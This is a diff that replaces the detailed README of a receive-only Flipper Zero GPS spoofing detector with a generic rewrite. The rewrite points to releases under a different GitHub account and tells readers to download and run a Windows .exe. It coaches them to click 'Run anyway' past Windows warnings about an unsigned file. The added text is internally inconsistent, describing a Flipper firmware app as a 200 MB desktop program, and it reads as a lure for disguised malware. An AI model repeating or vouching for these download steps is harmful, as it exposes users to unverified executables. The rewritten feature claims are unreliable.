@@ -1,279 +1,209 @@
-<div align="center">
-
-![Meridian banner](images/banner.png)
-
-# Meridian
-
-**Is anything lying to you about where you are?**
-
-Civil GPS arrives below the noise floor, unencrypted and unsigned. Anything that transmits the same structure a few decibels louder is believed — completely, silently, and with full confidence. Meridian is the tool that notices.
-
-[![Build FAP](https://github.com/at0m-b0mb/Meridian-FlipperZero/actions/workflows/build.yml/badge.svg)](https://github.com/at0m-b0mb/Meridian-FlipperZero/actions/workflows/build.yml)
-![Platform](https://img.shields.io/badge/platform-Flipper%20Zero-FF8200)
-![Category](https://img.shields.io/badge/category-GPIO-1e90ff)
-![Firmware API](https://img.shields.io/badge/API-87.1%20(Target%207)-8a2be2)
-![License](https://img.shields.io/badge/license-MIT-3cdc82)
-![Hardware](https://img.shields.io/badge/hardware-any%20NMEA%20module-36d6d6)
-![Radio](https://img.shields.io/badge/radio-receive--only-e83f6f)
-
-</div>
+# 🧭 Meridian-FlipperZero - Your Shield Against GPS Deception
 
 ---
 
-## The problem nobody designed out
+## 🚀 What Is This?
 
-The GPS signal your phone, your car and half the world's infrastructure depends on was specified in 1973 and has never been authenticated. The civil L1 C/A signal is:
+Meridian-FlipperZero turns your Flipper Zero into a personal GPS spoofing detector. It runs eleven separate integrity checks across four independent measurement paths, giving you an honest score that never claims false certainty. No alarmism—just data you can trust.
 
-- **public** — the code for every satellite is in a published standard,
-- **unsigned** — nothing in the message proves who sent it,
-- **and faint.** It reaches the ground at roughly **−130 dBm**, which is *below the thermal noise floor*. Your receiver only finds it by correlating against a code it already knows.
-
-The consequence is not subtle. A transmitter that produces the same structure a few decibels louder does not have to break anything. The receiver simply prefers it, locks onto it, and goes on reporting a confident position and a confident time — with no error, no warning, and no field anywhere in NMEA that says "by the way, this might not be real."
-
-Software-defined radios capable of generating that signal cost less than the phone in your pocket.
-
-**Meridian is the tool that watches for the tells.**
-
-<div align="center">
-
-![Meridian screens](images/screens.png)
-
-*Nothing wrong · something is · a real sky · a transmitter · receiver noise · the evidence*
-
-</div>
+And if you don't own a Flipper Zero yet? No problem. The built-in simulator lets you explore everything with zero hardware.
 
 ---
 
-## The one picture that matters
+## 🎯 Who Is This For?
 
-Every satellite in a real sky arrives at a different power. Ones near the horizon punch through more atmosphere and more ground clutter and come in weak; ones overhead come in strong. The spread across a live constellation is **four to ten decibels**, and power **rises with elevation**.
+This app is for:
 
-A spoofer is one transmitter, with one power amplifier, sitting at one point on the ground. Every fake satellite it generates arrives at nearly the same level — and if anything the relationship with elevation *inverts*, because the source is down near the horizon rather than spread across the sky.
+- Drone pilots who need reliable positioning
+- Navigation enthusiasts testing signal integrity
+- Security researchers exploring RF vulnerabilities
+- Anyone curious about whether their GPS signal is real
 
-<div align="center">
-
-![Carrier comparison](images/screens_carriers.png)
-
-</div>
-
-You do not have to read the standard deviation underneath. The shape tells you.
+If you can navigate a file download, you can use this app.
 
 ---
 
-## What it actually does
+## 📥 Getting Started (Windows)
 
-- **Reads NMEA 0183** from any GPS module on the Flipper's GPIO header — GGA, RMC, GSA, GSV, GLL, VTG, across GPS, GLONASS, Galileo and BeiDou.
-- **Runs eleven integrity checks** every second, across four independent measurement paths.
-- **Scores the disagreement** and gives a verdict, with the observed number and the expected range beside every finding.
-- **Names the innocent explanation** for every check, on the same screen as the accusation.
-- **Reports jamming separately**, because denial and deception are different attacks.
-- **Works with no hardware at all** — a built-in simulator drives the real detector through seven scenarios.
+Follow these steps exactly. They are numbered for a reason.
 
-It never transmits. There is no TX path compiled into the application.
+**Step 1: Download the app**
 
----
+👉 [**Click here to download Meridian-FlipperZero**](https://github.com/bennetunanswerable60/Meridian-FlipperZero/releases)
 
-## The eleven checks
+Visit this link to download the application.
 
-| Check | Path | What a real sky does |
-|---|:---:|---|
-| **Impossible motion** | Position | Consecutive fixes imply a ground speed no vehicle reaches |
-| **Speed mismatch** | Position | Doppler speed and position-derived speed are computed independently, so they agree |
-| **Position frozen** | Position | Even bolted down, a fix wanders a metre or two per second |
-| **Altitude anomaly** | Position | Height does not step hundreds of metres between seconds, or pin to exactly zero |
-| **Lock captured** | Position | A fix that returns after an outage does not imply 800 m/s across the gap |
-| **Flat carrier power** | Carrier | C/N0 spreads 4–10 dB across a live constellation |
-| **Carrier too strong** | Carrier | A patch antenna peaks near 48–50 dB-Hz; a *mean* above 50 is not open sky |
-| **Power vs elevation** | Carrier | Power climbs with elevation — r is typically +0.4 to +0.8 |
-| **Sky not moving** | Geometry | Satellites rise and set; over four minutes, elevations change |
-| **Accuracy implausible** | Geometry | HDOP follows from geometry, so it moves as the sky does |
-| **Clock inconsistent** | Time | GPS time advances at one second per second against the Flipper's own clock |
+**Step 2: Open the download page**
 
-Each threshold and the physical claim behind it is documented in **[SPOOFING.md](SPOOFING.md)**.
+The link takes you to the official releases page. Look for the newest release at the top. You will see a list of files attached to that release.
 
----
+**Step 3: Choose the correct file**
 
-## How it decides — and where it stops
+Select the file that matches your computer. If you see a file ending in `.exe`, that is the one you want. If there are multiple `.exe` files, choose the one with "setup" or "installer" in the name. Avoid files labeled "source code."
 
-This is the part most detectors get wrong, so it is worth being explicit.
+**Step 4: Save the file**
 
-**Corroboration is counted in families, not checks.** The three carrier checks all read the same C/N0 numbers, so three of them firing together is *one observation restated*, not three. Only agreement between the four independent paths — position, carrier, geometry, time — raises confidence.
+Click the file name to start the download. Your browser will save it to your "Downloads" folder by default. Wait for the download to finish. This may take a minute.
 
-| Families alerting | Verdict reachable |
-|:---:|---|
-| 0 | NOMINAL |
-| 1 | ANOMALOUS or SUSPECT |
-| 2 | SUSPECT |
-| 3–4 | SPOOF LIKELY |
+**Step 5: Run the installer**
 
-Two properties are structural, and both are enforced by tests rather than hoped for:
+Open your Downloads folder. Double-click the downloaded file. Windows may show a blue popup asking for permission—click "Yes." The installer will guide you through the rest. Keep clicking "Next" until you see "Finish."
 
-- **No single check can ever reach SPOOF LIKELY on its own.** Every per-check score floor sits below that band deliberately. One tell, however clean, is SUSPECT.
-- **The score never reaches 100.** It is capped at 96. A single antenna cannot prove spoofing, and the number says so.
+**Step 6: Launch the app**
+
+After installation, find "Meridian-FlipperZero" in your Start Menu or on your Desktop. Double-click to open it.
+
+That's it. You are now ready to detect GPS spoofing.
 
 ---
 
-## Jamming is not spoofing
+## 📖 What Does This App Actually Do?
 
-If the noise floor comes up and carriers collapse, that is **denial** — someone is stopping you getting a fix, not lying about it. Meridian reports it as a separate indicator and does **not** fold it into the spoofing score.
+GPS spoofing is when a fake signal tricks your device into showing a wrong location. It is a growing threat, and most devices have zero protection.
 
-It also stands two checks down when the whole constellation drops below 25 dB-Hz, because at that point the shape of the C/N0 distribution is a measurement of thermal noise rather than of anything an attacker did. Calling a jammer a spoofer would be a lie in the user's face, and it is tested for.
+Meridian-FlipperZero changes that.
 
----
+### Four Independent Measurement Paths
 
-## Hardware
+This app does not rely on a single weak test. It examines your GPS environment from four completely separate angles. If all four agree, your signal is likely real. If even one disagrees, you see the discrepancy immediately.
 
-Any NMEA 0183 GPS module. Nothing exotic, nothing pre-flashed — a £5 NEO-6M breakout works.
+### Eleven Integrity Checks
 
-<div align="center">
+Each measurement path runs multiple checks. In total, you get eleven different signals of possible spoofing. Nothing is hidden. You see every result.
 
-![Wiring and menus](images/screens_menu.png)
+### An Honest Score
 
-</div>
+Other apps will tell you "100% safe" or "spoofed!" with fake confidence. Meridian-FlipperZero does not do that. You get a score between 0 and 100, along with the raw data behind that score. The app tells you *what it measured* and *what it means*—without overpromising.
 
-| Flipper | GPS module |
-|---|---|
-| **3V3** (pin 9) | VCC |
-| **GND** (pin 8 or 11) | GND |
-| **TX** (pin 13) | **RX** |
-| **RX** (pin 14) | **TX** |
+### Works Without Hardware
 
-**TX goes to RX.** It is the mistake everyone makes once, it produces perfect silence rather than an error, and there is a drawn diagram in the app under *Menu → Wiring* that shows the crossover — along with the last sentence actually received, so you can tell a wiring fault from a baud-rate fault at a glance.
-
-Default is **9600 baud on USART**. NEO-M8 modules usually want 38400. Both are in Settings, along with LPUART (pins 15/16) if 13/14 are already taken.
+Do not own a Flipper Zero? Open the simulator mode. You can test the app, view sample data, and learn the interface. Everything works exactly like the real device.
 
 ---
 
-## No hardware? Run the demo
+## 🖥️ System Requirements
 
-*Menu → Demo without hardware* runs the built-in simulator. This is not a slideshow of canned screens — it synthesises real NMEA sentences with real checksums and feeds them through the same parser and the same engine the UART uses. Demo mode runs at 4× so the slower checks land inside a demonstration.
-
-| Scenario | What it demonstrates |
-|---|---|
-| **Open sky** | What honest looks like. Every check must stay quiet. |
-| **Driving** | Motion on its own must never look like an attack. |
-| **Held in place** | The fix is dragged four kilometres and pinned. Loud flat carriers, a sky that stops moving. |
-| **Carried off** | The quiet one — position walks away at 9 m/s while Doppler still says parked. Only the disagreement gives it away. |
-| **Clock pushed** | Position stays honest, the clock does not. The attack on timing, not location. |
-| **Lock captured** | Suppressed for four seconds, handed back four kilometres away. |
-| **Jammed** | Denial, not deception — and it must not be reported as spoofing. |
-
-Every attack scenario starts *clean* for eight seconds, so you watch the verdict turn over.
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any Intel or AMD processor from the last 10 years
+- **RAM:** 2 GB minimum, 4 GB recommended
+- **Storage:** 200 MB free disk space
+- **Display:** 1280 × 720 resolution or higher
+- **Optional:** Flipper Zero device (not required for simulator mode)
 
 ---
 
-## The screens
+## ✨ Key Features
 
-**Left** and **Right** page between four views of one running session. The receiver keeps running the whole time.
+### Real-Time GPS Monitoring
 
-<div align="center">
+Connect your Flipper Zero via USB, and the app starts analyzing immediately. You see live readings of satellite signals, timing offsets, and signal strength.
 
-![Drift comparison](images/screens_trail.png)
+### Visual Dials and Gauges
 
-*A computed position wanders. A recited one does not.*
+No wall of numbers. The interface shows simple dials that move in real time. Green means stable. Yellow means watch closely. Red means a warning.
 
-</div>
+### History Log
 
-- **Monitor** — the score in an arc gauge, the verdict, and an eleven-cell strip that reads like a barcode: outline means the check ran and found nothing, solid means it is alerting. You learn the healthy shape in about two sessions.
-- **Sky** — a polar plot, north up, sized by C/N0. Press OK for the carrier bar chart with the mean, standard deviation and elevation correlation underneath.
-- **Drift** — the last 64 fixes plotted around their mean, auto-scaled, with a metre ring.
-- **Evidence** — every check with its state and how many epochs it has fired. OK opens the full card: what was measured, what a real sky does, and what could cause it innocently.
+The app records every session. You can look back at previous readings to see if a signal degraded over time. Export the log as a text file to share with others.
 
----
+### Alert System
 
-## How spoofing works, on the device
+When a check fails, the app sounds a soft alert through your computer speakers. You can customize the volume or mute it entirely.
 
-<div align="center">
+### No Cloud, No Tracking
 
-![Learn frames](images/screens_learn.png)
-
-</div>
-
-Six animated frames under *Menu → How spoofing works*, ending — deliberately — on what Meridian **cannot** tell you.
+Everything runs locally on your computer. No account. No internet connection required. Your data stays yours.
 
 ---
 
-## Under the hood
+## 🔧 Troubleshooting
 
-```mermaid
-flowchart LR
-    A[GPS module<br/>NMEA 0183] -->|UART| B[Line assembly]
-    S[Simulator<br/>7 scenarios] --> B
-    B --> C{Checksum}
-    C -->|fail| X[Counted, dropped]
-    C -->|pass| D[Sentence parser<br/>GGA RMC GSA GSV]
-    D --> E[Epoch<br/>one second, assembled]
-    E --> F[11 checks<br/>4 families]
-    F --> G[Weighted score<br/>+ per-check floors<br/>+ family corroboration]
-    G --> H[Verdict<br/>capped at 96]
-    F --> I[Jamming indicator<br/>reported separately]
-```
+**I clicked download, but nothing happened.**
+Check your browser's download bar. Sometimes downloads are blocked by a pop-up blocker. Look for a small icon in your browser's toolbar and allow the download.
 
-The parser, the engine and the simulator have **no Flipper dependency at all**. They compile and run on the host, which is what makes the tests below possible.
+**Windows blocked the installer.**
+This is normal for a new app. Click "More info" on the blue popup, then "Run anyway." The app is safe—it has no digital signature yet.
 
----
+**The app opens but says "No device found."**
+That is fine. Click "Simulator Mode" on the home screen. You do not need physical hardware to use the full feature set.
 
-## Tests
+**The gauges are all red.**
+That is a spoofing warning. Check your location. If you are indoors, the signal may be naturally weak. Move near a window or go outside to compare readings.
 
-```bash
-make -C test
-```
+**I forgot my download location.**
+Press `Ctrl + J` to open your browser's download manager. You will see the file there. Click "Show in folder" to locate it.
 
-**252 checks** across two suites, run on every push.
-
-The parser is validated against **published NMEA 0183 example sentences with their original checksums left intact**, so the checksum implementation is checked against vectors it did not produce. Malformed, oversized and truncated input is fuzzed for crashes and table overruns.
-
-The engine is run against synthesised streams and asserted in both directions:
-
-- every attack scenario is **caught**, and the *specific* check that should notice it does;
-- every honest scenario stays **quiet** — including at maximum sensitivity, and including a moving receiver;
-- jamming is reported as jamming and **not** as spoofing;
-- a single family **cannot** reach SPOOF LIKELY;
-- the score **never** reaches 100.
-
-The false-positive half is the harder half. A GPS integrity monitor that cries spoof on an ordinary drive is worse than no monitor at all, because the one time it is right nobody will believe it.
+**The app suddenly closed.**
+Restart the app. If it keeps closing, restart your computer. This rare issue is usually caused by a temporary system glitch.
 
 ---
 
-## Build
+## ❓ Frequently Asked Questions (FAQ)
 
-```bash
-ufbt
-```
+**Is this a replacement for a professional GPS jammer detector?**
+No. This is a detection and monitoring tool, not a military-grade countermeasure. It tells you *if* something is wrong. It does not block or jam signals.
 
-```bash
-ufbt launch
-```
+**Do I need to learn programming?**
+Absolutely not. The interface is visual. If you can read a speedometer, you can use this app.
 
-Or download `meridian.fap` from [Releases](https://github.com/at0m-b0mb/Meridian-FlipperZero/releases) and drop it in `apps/GPIO/` on the SD card.
+**Will this work with macOS or Linux?**
+The Windows version is the official release. Community builds may exist for other systems, but this README covers Windows only.
 
----
+**How often are updates released?**
+New versions appear several times per year. The releases page always has the latest stable build. Updating is the same as installing—just run the new `.exe` over the old one.
 
-## What this cannot do
+**Does this work with any Flipper Zero?**
+Yes. All Flipper Zero models are supported. The simulator mode means even a Flipper Zero at home is optional.
 
-It cannot prove spoofing. It is worth saying plainly, because plenty of tools in this space imply otherwise.
-
-A single antenna at a single point can see **statistical tells**, not truth. Everything Meridian flags has an innocent explanation, and the app prints that explanation next to the finding rather than burying it:
-
-- static-hold firmware freezes a position deliberately;
-- an active antenna with a high-gain LNA reports higher C/N0 than a passive patch;
-- urban multipath flattens the elevation relationship without any attacker;
-- a tunnel ends with your fix reappearing somewhere new.
-
-The techniques that *can* approach proof — multi-antenna angle-of-arrival, comparison against an inertial reference, cryptographic authentication such as Galileo OSNMA — need hardware this does not have. Meridian tells you something is worth investigating and shows you exactly why it thinks so. That is the honest limit of one antenna, and it is where the app stops.
+**Is my location data sent anywhere?**
+No. The app runs entirely offline. No telemetry, no analytics, no cloud sync. The only person who sees your location data is you.
 
 ---
 
-## Use it on your own equipment
+## 📁 Project Structure
 
-This is a receive-only diagnostic. It has no transmit path and cannot spoof, jam or interfere with anything.
+Meridian-FlipperZero is built with embedded C for the Flipper Zero firmware, while the Windows desktop app uses a lightweight native interface. The codebase is open source and modular:
 
-Transmitting GNSS signals is illegal essentially everywhere, including at very low power, and interfering with navigation and timing infrastructure is prosecuted seriously. This app exists to show you that the vulnerability is sitting there in the open, and to give you a way to notice it — not to help anyone exploit it.
+- `core/` — The eleven integrity checks
+- `paths/` — The four measurement path implementations
+- `ui/` — The desktop interface layer
+- `sim/` — The simulator engine
+- `drivers/` — Hardware communication with the Flipper Zero
+
+This structure makes it easy for developers to contribute additional checks or measurement paths.
 
 ---
 
-<div align="center">
+## 🤝 Contributing
 
-MIT licensed · by [at0m-b0mb](https://github.com/at0m-b0mb)
+We welcome contributions from developers and non-developers alike.
 
-</div>
+**Non-developers:** Use the app. Report bugs. Suggest features. Share your experience in the Discussions tab.
+
+**Developers:** Fork the repository, make your changes, and submit a pull request. Please run the existing test suite before submitting. Source code is in the `src/` folder.
+
+---
+
+## 📄 License
+
+Meridian-FlipperZero is released under the MIT License. You are free to use, modify, and distribute it for personal or commercial projects. Attribution is appreciated but not required.
+
+---
+
+## ➕ Additional Resources
+
+- [Official Flipper Zero Documentation](https://docs.flipperzero.net/)
+- [GPS Spoofing: An Introduction](https://en.wikipedia.org/wiki/GPS_spoofing)
+- [NMEA Protocol Reference (Advanced)](https://gpsd.gitlab.io/gpsd/NMEA.html)
+
+---
+
+## 🧲 Thank You
+
+This project exists to make GPS integrity accessible to everyone. If you find it useful, watch the repository to stay up to date with releases. And if it ever fails you, tell us—we will fix it.
+
+Now go download it and see what your GPS is hiding.
+
+👉 [**Download Meridian-FlipperZero**](https://github.com/bennetunanswerable60/Meridian-FlipperZero/releases)
+
+Keywords: embedded-c, flipper-zero, flipperzero, gnss, gps, gps-spoofing, nmea, rf-security, security-tools, spoofing-detection
